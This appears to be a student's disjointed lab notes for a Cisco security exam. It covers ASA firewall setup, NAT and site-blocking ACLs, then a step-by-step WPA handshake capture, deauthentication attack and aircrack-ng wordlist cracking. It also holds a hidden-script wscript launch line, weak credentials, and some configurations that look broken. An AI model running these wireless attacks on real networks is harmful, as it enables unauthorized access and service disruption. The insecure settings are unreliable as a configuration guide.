@@ -1,0 +1,350 @@
+#scor350-701
+ASAconsole:
+config t
+enable
+_____  --> means no password
+
+task2: ASA version, int, and license:
+
+When the ASA is in routed mode the networks that are connected to
+ the ASA on two interfaces need to be on different subnets.  
+ While in transparent mode the subnets can be the same.
+
+In routed mode, as the name indicates, packets are routed between 
+the interfaces.  In transparent mode interfaces are bridged so 
+the packet is forwarded instead of routed 
+(though inspection and ACL checks still take place).
+
+One situation could be that you need to implement a firewall in your 
+network but your network design doesn't allow for changing the IP addressing
+ scheme at this point in time.  Then you can place the ASA in transparent mode into the network
+ and you will not need to change any IPs, just assign an IP within the 
+ LAN subnet to the ASA.
+
+Another situation might require you to implement a firewall that is not
+ visible to programs that scan the network.  In this case you would
+ implement the ASA in transparent mode and it will act like a "bump in the road".
+ It will not be registered as a hop-count in the network, 
+ but will still be filtering traffic.
+ 
+TASK1: erase the ASA to factory:
+b.	You can restore the ASA to its factory default settings by using the 
+configure factory-default global configuration command:
+
+ciscoasa(config)# configure factory-default
+
+step2:Step 5: Clear the previous ASA configuration settings.
+
+ciscoasa# write erase
+ciscoasa# reload
+
+Step 3: Bypass Setup mode and configure the ASDM interfaces:
+
+Pre-configure Firewall now through interactive prompts [yes]? no
+
+d.	Configure the inside interface G1/8 to prepare for ASDM access. 
+The Security Level should be automatically set to the highest level of 100.
+The interface G1/8 will be used by PC-B to access ASDM on ASA.
+
+confi t
+Int gi 1/8
+nameif inside
+ip add 10.12.8.1 255.255.255.0
+security-level 100
+no shut
+exit
+
+enable telnet/ssh on ASA:
+config t
+passwd pass
+username admin password pass
+telnet 10.12.8.8 255.255.255.255 inside
+telnet timeout 1440
+
+If you want ssh: you need local authentication:
+
+config t
+username admin password pass
+aaa authentication telnet console LOCAL
+!enable ssh:
+crypto key generate rsa modulus 1024
+ssh 10.12.8.8 255.255.255.255 inside
+ssh timeout 60
+aaa authentication ssh console LOCAL
+
+TASK3: Configure the OUTSIDE Interface:
+config t
+int gi 1/1
+nameif outside
+security-level 0
+ip add 200.0.0.12 255.255.255.0
+no shut
+
+TASK4: Configure ASDM and verify access to aSA:
+config t
+http server enable
+http 10.12.8.0 255.255.255.0 inside
+
+c:\Windows\System32\wscript.exe invisible.vbs run.bat
+
+TASK5:
+https://www.networkstraining.com/block-websites-cisco-asa-firewall/
+
+!Create FQDN objects for website we want to block. Block both the www and non-www domains
+object network obj-www.pornhub.com
+ fqdn www.pornhub.com
+
+object network obj-pornhub.com
+fqdn pornhub.com
+
+!Add the FQDN objects above to an ACL applied inbound to the inside interface
+access-list INSIDE-IN extended deny ip any object obj-www.pornhub.com
+access-list INSIDE-IN extended deny ip any object obj-pornhub.com
+access-list INSIDE-IN extended permit ip any any
+
+!Apply the ACL above to the inside interface
+access-group INSIDE-IN in interface inside
+
+TASK2: 
+FIREWALLS: designed to block traffic:
+physical, cloud, virtual, gui,etc.
+
+############ASA default route to internet:############ 
+
+route outside 0.0.0.0 0.0.0.0 200.0.0.1 1
+
+Task2: ASA NAT:
+
+confi t
+! Create object network for inside network
+object network INSIDE_NETWORK
+  subnet 10.12.8.0 255.255.255.0
+
+! Create object network for outside interface
+object network OUTSIDE_INTERFACE
+  subnet 200.0.0.0 255.255.255.0
+
+! Configure NAT for PAT
+nat (inside,outside) source dynamic INSIDE_NETWORK interface
+
+! Configure access control policy
+access-list INSIDE_ACCESS extended permit ip any any
+
+! Apply access control policy to inside interface
+access-group INSIDE_ACCESS in interface inside
+
+! Configure default route and interface
+route outside 0.0.0.0 0.0.0.0 200.0.0.1
+
+! Enable ASDM access
+!http server enable
+!http <management-IP> <management-mask> inside
+
+! Allow ASDM access from specified IP
+!http <your-IP> <your-mask> inside
+
+! Optional: Configure logging
+logging enable
+logging timestamp
+logging buffer-size 16384
+logging buffered informational
+logging asdm informational
+
+! Save the configuration
+write memory
+
+
+Task3: Block Pornhub.com
+
+config t
+! Create object group for PornHub
+object-group network PornHub
+  network-object host 173.0.55.112
+
+! Create access-list to block PornHub
+access-list BLOCK_PORN extended deny ip any object-group PornHub
+access-list BLOCK_PORN extended permit ip any any
+
+! Apply access-list to outside interface
+access-group BLOCK_PORN in interface outside
+
+! Configure ASDM object for PornHub
+object network OBJ_PornHub
+  host 173.0.55.112
+
+! Configure NAT exemption for PornHub
+nat (inside,outside) source static OBJ_PornHub OBJ_PornHub destination static any OBJ_PornHub
+
+! Configure default route and interface
+route outside 0.0.0.0 0.0.0.0 <next-hop-IP>
+
+! Enable ASDM access
+http server enable
+http <management-IP> <management-mask> inside
+
+! Allow ASDM access from specified IP
+http <your-IP> <your-mask> inside
+
+! Optional: Configure logging
+logging enable
+logging timestamp
+logging buffer-size 16384
+logging buffered informational
+logging asdm informational
+
+! Save the configuration
+write memory
+
+TASK4: wpa/wpa2 hacking:
+
+!Cisco Wireless Config:
+Cisco Autonomous:
+config t
+Dot11 ssid hackme12
+ authentication open
+ authentication key-management wpa
+ wpa-psk ascii C1sc0123
+ guest-mode
+Int Dot11Radio 0
+ channel 9
+ no shut
+ encryption mode ciphers tkip
+ ssid hackme12
+end
+ 
+or WEP:
+
+config t
+Dot11 ssid hackme12
+ authentication open
+ !authentication key-management wpa
+ !wpa-psk ascii C1sc0123
+ guest-mode
+Int Dot11Radio 0
+ channel 9
+ no shut
+ !encryption key 1 size 40bit 7 447B6D514EB7 transmit-key
+ encryption key 1 size 40bit 7 cafef00db00b transmit-key
+ encryption mode wep mandatory
+ ssid hackme12
+end
+
+
+ 
+step1: disconnect wifi:
+
+step2:
+└─# airmon-ng
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           iwlwifi         Intel Corporation Wireless 8260 (rev 3a)
+
+
+step3: 
+airmon-ng start wlan0
+
+ airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    671 NetworkManager
+    818 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           iwlwifi         Intel Corporation Wireless 8260 (rev 3a)
+        wlan0 is soft blocked, please run "rfkill unblock 1" to use this interface.
+rfkill error, unable to start wlan0
+
+Would you like to try and automatically resolve this? [y/n] y
+
+airmon-ng check kill
+
+airmon-ng start wlan0mon
+
+airodump-ng wlan0mon
+
+TRYAGAIN:
+
+airodump-ng wlan0mon
+service networking restart
+service NetworkManager restart
+airmon-ng stop wlan0mon
+iwconfig
+
+#################
+WIRELESS HACKING:
+
+iwconfig
+
+*mode:Managed
+
+sudo airmon-ng check kill
+
+*PID Name
+
+sudo airmon-ng start wlan0
+
+*monitor mode vif enabled
+*station mode vif disabled
+
+iwconfig
+
+*Mode:Monitor
+
+sudo airmon-ng
+
+*wlan0mon
+
+SCAN WIFI AND GET THE DETAILS:
+
+sudo airodump-ng wlan0mon
+
+sudo airodump-ng wlan0mon -d <MAC.ADDRESS.NG TARGET.MO>
+
+
+THEN MO KUNG MAY NAKA CONNECT.
+
+sudo airodump-ng -w <FILE.NAME> -c 10 (CHANNEL) --bssid <MAC.ADDRESS.TARGET> wlan0mon
+
+OPEN NEW TERMINAL
+
+sudo aireplay-ng --deauth 0 -a <MAC.ADDRESS> wlan0mon
+
+WAIT UNTIL MAKUHA YUNG ( WPA handshake: MAC ADDRESS)
+
+OPTIONAL: wireshark filename.cap
+
+
+iwconfig
+
+wlan0 *Mode:Monitor
+
+airmon-ng stop wlan0mon
+
+Mode:Managed
+
+
+EXTRACT FIRST THE ROCKYOU.TAR in WORDLIST
+
+
+aircrack-ng filename.cap -w /usr/share/wordlists/rockyou.txt
+
+
+
+
+#################
+
+TASK5: SEIM: 
+
+#wazuh-user/ wazuh
+
+admin/SecretPassword
+
+
+
